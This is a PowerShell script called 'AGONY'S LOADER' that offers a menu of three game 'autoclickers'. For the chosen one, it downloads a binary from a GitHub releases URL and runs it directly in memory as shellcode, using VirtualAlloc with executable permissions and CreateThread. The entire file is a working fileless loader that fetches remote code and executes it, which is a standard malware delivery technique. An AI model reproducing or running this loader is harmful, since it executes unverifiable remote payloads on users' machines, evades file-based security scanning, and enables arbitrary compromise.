[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

$githubBase = "https://github.com/thegoatofapi/AL/releases/download/C/"

$autoclickers = @{
    "1" = @{ Name = "Poor Clicker"; File = "PC.bin" }
    "2" = @{ Name = "Sapphire LITE"; File = "SAPPHIRE.bin" }
    "3" = @{ Name = "Toad"; File = "TOAD.bin" }
}

Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Injector {
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    public static void Execute(byte[] shellcode) {
        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
        Marshal.Copy(shellcode, 0, mem, shellcode.Length);
        CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
    }
}
"@

Write-Host "`n=== AGONY'S LOADER ===" -ForegroundColor Cyan
Write-Host "`nSelect autoclicker:" -ForegroundColor Yellow
foreach ($key in $autoclickers.Keys | Sort-Object) {
    Write-Host "  $key. $($autoclickers[$key].Name)" -ForegroundColor White
}

$choice = Read-Host "`nEnter choice (1-3)"

if ($autoclickers.ContainsKey($choice)) {
    $selected = $autoclickers[$choice]
    Write-Host "`n[+] Downloading $($selected.Name)..." -ForegroundColor Cyan
    
    $url = $githubBase + $selected.File
    
    try {
        $webClient = New-Object System.Net.WebClient
        $shellcode = $webClient.DownloadData($url)
        
        Write-Host "[+] Executing..." -ForegroundColor Green
        [Injector]::Execute($shellcode)
        
        Write-Host "[+] Done!" -ForegroundColor Green
    } catch {
        Write-Host "[-] Error: $_" -ForegroundColor Red
    }
} else {
    Write-Host "`n[-] Invalid choice" -ForegroundColor Red
}
